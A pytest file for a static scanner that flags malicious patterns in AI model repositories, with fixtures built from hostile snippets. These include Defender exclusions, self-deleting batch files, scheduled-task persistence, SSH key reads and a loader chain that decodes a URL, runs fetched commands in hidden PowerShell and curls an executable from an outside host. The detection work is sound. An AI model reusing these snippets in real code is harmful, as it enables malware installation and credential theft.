"""
Tests for the static scanner.
Uses real code patterns from the OpenAI Hugging Face attack.
"""
import pytest
from app.scanner import StaticScanner, calculate_trust_score


scanner = StaticScanner()


def test_detects_base64_decode():
    files = {"loader.py": "import base64\ndata = base64.b64decode('aHR0cHM6Ly9ldmlsLmNvbQ==')"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "base64_decode" in names


def test_detects_ssl_disabled():
    files = {"loader.py": "import requests\nresp = requests.get(url, verify=False)"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "ssl_verification_disabled" in names


def test_detects_defender_exclusion():
    files = {"start.bat": "powershell -Command Add-MpPreference -ExclusionPath C:\\Users\\evil"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "defender_exclusion" in names


def test_detects_powershell_from_python():
    files = {"setup.py": "import subprocess\nsubprocess.run(['powershell', '-Command', cmd])"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "powershell_from_python" in names


def test_detects_self_deletion():
    files = {"run.bat": "start payload.exe\ndel /f %~f0"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "self_deletion" in names


def test_detects_bat_file_presence():
    files = {"start.bat": "@echo off\necho hello"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "suspicious_bat_in_ai_repo" in names


def test_detects_data_exfiltration():
    files = {"steal.py": "with open(os.path.expanduser('~/.ssh/id_rsa')) as f:\n    data = f.read()"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "data_exfiltration" in names


def test_detects_persistence():
    files = {"install.bat": "schtasks /create /tn MyTask /tr payload.exe /sc onlogon"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "persistence_mechanism" in names


def test_clean_file_no_matches():
    files = {"model.py": "import torch\nmodel = torch.nn.Linear(10, 2)\nprint(model)"}
    matches = scanner.scan_files(files)
    assert len(matches) == 0


def test_score_dangerous_with_critical_findings():
    files = {
        "loader.py": "import base64\neval(base64.b64decode('cGF5bG9hZA=='))",
        "start.bat": "Add-MpPreference -ExclusionPath C:\\Windows",
    }
    matches = scanner.scan_files(files)
    score = calculate_trust_score(matches)
    assert score < 40  # should be dangerous


def test_score_clean_repo():
    matches = []
    score = calculate_trust_score(matches)
    assert score == 100


def test_full_attack_chain_detected():
    """Simulates the exact OpenAI Hugging Face attack file patterns."""
    files = {
        "loader.py": """
import base64, requests, ssl
ssl._create_default_https_context = ssl._create_unverified_context
url = base64.b64decode('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9zZWNyZXQ=').decode()
cmd = requests.get(url).json()['cmd']
import subprocess
subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd])
""",
        "start.bat": """
@echo off
powershell -Command "Add-MpPreference -ExclusionPath C:\\Users\\Public"
curl -o payload.exe http://api.eth-fastscan.org/sefirah.exe
start /b payload.exe
del /f %~f0
""",
    }
    matches = scanner.scan_files(files)
    score = calculate_trust_score(matches)
    categories = {m.category for m in matches}

    assert score < 20, f"Expected score < 20, got {score}"
    assert "obfuscation" in categories
    assert "network" in categories
    assert "system_exec" in categories
    assert len(matches) >= 5
